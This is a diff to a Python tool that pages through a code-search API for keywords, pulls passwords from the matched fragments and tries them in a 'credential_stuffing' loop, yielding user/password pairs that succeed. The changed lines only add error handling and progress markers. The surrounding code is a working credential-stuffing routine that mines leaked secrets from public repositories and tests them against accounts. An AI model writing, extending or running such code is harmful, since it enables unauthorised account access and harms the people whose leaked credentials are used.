@@ -29,10 +29,12 @@ def search_code(keywords: str) -> Iterable[dict]:
     for i in itertools.count():
         params = dict(q=keywords, page=i)
         r = requests.get(API + '/search/code', params, headers=HEADERS)
-        items = json.loads(r.text)['items']
+        result = json.loads(r.text)
+        items = result.get('items')
         if items:
             yield from items
         else:
+            print('\n', result.get('message', result))
             return
 
 
@@ -46,6 +48,7 @@ def credential_stuffing(keywords: str, find: Callable, pause=60) -> Iterable:
         for match in document['text_matches']:
             password = find(match['fragment'])
             if not password or password in tried_passwords:
+                progress('.')
                 continue
 
             tried_passwords.add(password)
@@ -54,7 +57,7 @@ def credential_stuffing(keywords: str, find: Callable, pause=60) -> Iterable:
                 yield user, password
                 break
             else:
-                progress()
+                progress(':')
                 time.sleep(pause)
 
 
